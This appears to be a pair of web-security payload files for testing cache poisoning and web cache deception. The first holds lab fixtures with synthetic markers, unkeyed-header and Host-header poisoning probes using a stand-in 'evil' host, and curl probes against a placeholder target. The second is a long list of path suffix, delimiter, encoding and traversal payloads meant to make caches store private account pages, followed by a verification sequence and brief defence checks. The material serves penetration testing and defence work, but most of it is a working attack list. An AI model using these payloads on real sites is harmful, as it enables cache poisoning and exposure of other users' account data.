sections.label: Cache Normalization, Cloaking and Authenticated Isolation Fixtures

Path normalization: compare key normalization and origin routing using controlled marker pages
Unkeyed headers: use one at a time on a response fixture that exposes only a synthetic marker

# Cache Normalization, Cloaking and Authenticated Isolation Fixtures
# Dedicated lab cache only. Use synthetic pages and a fresh cache key for each experiment.

# Duplicate-query parsing: determine which occurrence the cache and origin actually use
/cache-lab/page?view=public&view=CACHE_DUPLICATE_MARKER&labKey=case-duplicate-01
/cache-lab/page?view=CACHE_DUPLICATE_MARKER&view=public&labKey=case-duplicate-02

/cache-lab/page?utm_content=CACHE_TRACKING_MARKER&labKey=case-tracking-01
/cache-lab/page?labKey=case-tracking-01

# Parameter cloaking controls: separator support is framework-specific
/cache-lab/page?view=public;view=CACHE_SEMICOLON_MARKER&labKey=case-semicolon-01
/cache-lab/page?view=public%26view%3DCACHE_ENCODED_SEPARATOR&labKey=case-encoded-01
/cache-lab/page?view=public%3Bview%3DCACHE_ENCODED_SEMICOLON&labKey=case-encoded-02

# Path normalization: compare key normalization and origin routing using controlled marker pages
/cache-lab/public/../private-marker.css?labKey=case-dot-01
/cache-lab/public/%2e%2e/private-marker.css?labKey=case-dot-02
/cache-lab/public%2f..%2fprivate-marker.css?labKey=case-slash-01
/cache-lab/page;asset.css?labKey=case-semicolon-path-01
/cache-lab/page%3fasset.css?labKey=case-delimiter-01
/cache-lab//page?labKey=case-double-slash-01

# Unkeyed headers: use one at a time on a response fixture that exposes only a synthetic marker
X-Forwarded-Host: cache-marker.example.test
X-Forwarded-Proto: http
X-Original-URL: /cache-lab/header-marker
X-Rewrite-URL: /cache-lab/rewrite-marker
Accept-Language: zz-CACHE-LAB

# Cookie-keying differential: response fixture intentionally varies its harmless theme marker
Cookie: cache_lab_theme=CACHE_COOKIE_MARKER

# Authenticated cache-deception paths: own synthetic profile only
/cache-lab/account/profile/fixture.css?labKey=case-auth-01
/cache-lab/account/profile;fixture.js?labKey=case-auth-02
/cache-lab/account/profile%2ffixture.png?labKey=case-auth-03

# Authorization-header isolation: placeholder only; use a locally issued lab token privately
Authorization: Bearer LAB_CACHE_USER_A_TOKEN

# Baseline negative control: configure Cache-Control: private, no-store and verify no shared storage.

GET /cache-lab/body?labKey=case-body-01 HTTP/1.1\r\nHost: cache.example.test\r\nContent-Length: 22\r\n\r\nview=CACHE_BODY_MARKER

# Unkeyed-header reflection probes (send with a unique marker, check if reflected + cached)
X-Forwarded-Host: evil-cachepoison-marker.example
X-Forwarded-Scheme: evil-cachepoison-marker
X-Original-URL: /evil-cachepoison-marker
X-Rewrite-URL: /evil-cachepoison-marker
X-Host: evil-cachepoison-marker.example
X-Forwarded-Server: evil-cachepoison-marker.example

# Host header cache poisoning
Host: evil-cachepoison-marker.example

# Fat GET / parameter cloaking (duplicate param, backend vs cache may read different one)
/reset-password?utm_content=evil-cachepoison-marker&utm_content=legit

# Cache-buster for isolating responses during testing (append unique value per request)
?cb=evil-cachepoison-marker-UNIQUE

# Cache-deception probe paths (request while authenticated, re-check unauthenticated)
/account/settings/nonexistent.css
/my-profile/avatar/../settings.js
/api/user/me%2e%2e%2fstatic.js

# Headers to inspect in the response to confirm caching behavior
Cache-Control
Age
X-Cache
X-Cache-Hit
CF-Cache-Status
Vary
Surrogate-Control

# curl probes
curl -s -D- -H "X-Forwarded-Host: evil-cachepoison-marker.example" https://TARGET_HOST/ | grep -i "evil-cachepoison-marker\|x-cache\|age:"
curl -s -D- -o /dev/null https://TARGET_HOST/?cb=evil-cachepoison-marker-UNIQUE | grep -i "x-cache\|age:"

files.name: web-cache-deception-payloads.txt

sections.label: Web Cache Deception Payloads
Static-extension suffix on a dynamic path (origin ignores the suffix; cache keys on extension)
Path parameter / delimiter confusion (origin treats the delimiter as the end of the route; cache does not)
Normalisation discrepancies (cache normalises path before keying, origin does not, or the reverse)
Static directory prefix (cache rule matches /static/, /assets/, /images/ and similar)
Well-known cached files (exact-name cache rules: robots.txt, favicon.ico, index.html)
Verification sequence (use two test accounts, A and B, and a unique cache-busting segment)
Cache headers to read in the responses
Cache key probing (find what the cache keys on)
Defence checks (what a fixed deployment returns)

# Web Cache Deception Payloads
# Make a cache store a dynamic, user-specific response as static content so another request can read it. Use two test accounts; never fetch another real user's data.

# Static-extension suffix on a dynamic path (origin ignores the suffix; cache keys on extension)
/account/settings/x.css
/account/settings/x.js
/account/settings/x.png
/account/settings/x.jpg
/account/settings/x.ico
/account/settings/x.svg
/account/settings/x.woff
/account/settings/x.json
/account/settings/x.txt
/account/settings/x.pdf
/account/settings/x.gif
/account/settings/x.map
/account/settings/x.avif
/account/settings/x.webp
/account/settings/robots.txt
/account/settings/favicon.ico
/account/settings/index.css
/account.css
/account.js
/account.png
/api/me/x.css
/api/me.css
/api/user/profile/x.js
/profile/x.css

# Path parameter / delimiter confusion (origin treats the delimiter as the end of the route; cache does not)
/account/settings;x.css
/account/settings;.css
/account/settings;/x.css
/account/settings%3Bx.css
/account/settings.css
/account/settings%00x.css
/account/settings%0ax.css
/account/settings%0dx.css
/account/settings%09x.css
/account/settings%20x.css
/account/settings%23x.css
/account/settings%3Fx.css
/account/settings?x.css
/account/settings#x.css
/account/settings,x.css
/account/settings:x.css
/account/settings!x.css
/account/settings@x.css
/account/settings$x.css
/account/settings&x.css
/account/settings'x.css
/account/settings*x.css
/account/settings+x.css
/account/settings=x.css
/account/settings|x.css
/account/settings~x.css
/account/settings%7Cx.css
/account/settings%2Fx.css

# Normalisation discrepancies (cache normalises path before keying, origin does not, or the reverse)
/static/..%2faccount/settings
/static/..%2Faccount/settings
/static/%2e%2e/account/settings
/static/%2e%2e%2faccount/settings
/static/..;/account/settings
/static/../account/settings
/static/.%2e/account/settings
/static%2f..%2faccount/settings
/assets/..%2faccount/settings
/resources/..%2faccount/settings
/images/..%2faccount/settings
/account/settings/..%2fx.css
/account/settings%2f%2e%2e%2fx.css
/account/settings/%2e%2e%2fstatic/x.css
/account/settings/..%2fstatic/x.css
/static/..%5caccount/settings
/static/%252e%252e/account/settings
/static/%c0%ae%c0%ae/account/settings

# Static directory prefix (cache rule matches /static/, /assets/, /images/ and similar)
/assets/../account/settings
/images/../account/settings
/js/../account/settings
/css/../account/settings
/public/../account/settings
/media/../account/settings
/resources/../account/settings
/wp-content/../account/settings

# Well-known cached files (exact-name cache rules: robots.txt, favicon.ico, index.html)
/account/settings/index.html
/robots.txt/../account/settings
/robots.txt%2f..%2faccount/settings
/favicon.ico/../account/settings
/index.html/../account/settings
/robots.txt;/account/settings

# Verification sequence (use two test accounts, A and B, and a unique cache-busting segment)
# 1. As account A (authenticated): GET /account/settings/x-<unique-token>.css
# 2. As account B or unauthenticated: GET the same URL
# 3. Vulnerable if the response contains account A's data and a cache header such as X-Cache: HIT, Age: >0 or CF-Cache-Status: HIT

# Cache headers to read in the responses
X-Cache: HIT
X-Cache: MISS
Age: 10
CF-Cache-Status: HIT
CF-Cache-Status: DYNAMIC
X-Cache-Status: HIT
X-Served-By:
X-Varnish:
Via: 1.1 varnish
X-Cache-Hits:
Cache-Control: public, max-age=3600
Cache-Control: no-cache
Vary: Cookie
Expires:
Surrogate-Control:
CDN-Cache-Control:
X-Akamai-Cache:
X-Amz-Cf-Pop:
Server-Timing: cdn-cache; desc=HIT

# Cache key probing (find what the cache keys on)
GET /?cb=cache-marker-1 HTTP/1.1
GET /?cb=cache-marker-1&utm_source=x HTTP/1.1
GET /?cb=cache-marker-1#fragment HTTP/1.1
GET /?CB=cache-marker-1 HTTP/1.1
GET //?cb=cache-marker-1 HTTP/1.1
GET /./?cb=cache-marker-1 HTTP/1.1
GET /?cb=cache-marker-1&cb=cache-marker-2 HTTP/1.1
GET /?cb=cache-marker-1;x=y HTTP/1.1

# Defence checks (what a fixed deployment returns)
# Dynamic routes should answer 404 for unknown suffixes
# Cache-Control: no-store on authenticated responses
# CDN rules keyed on Content-Type, not on URL extension
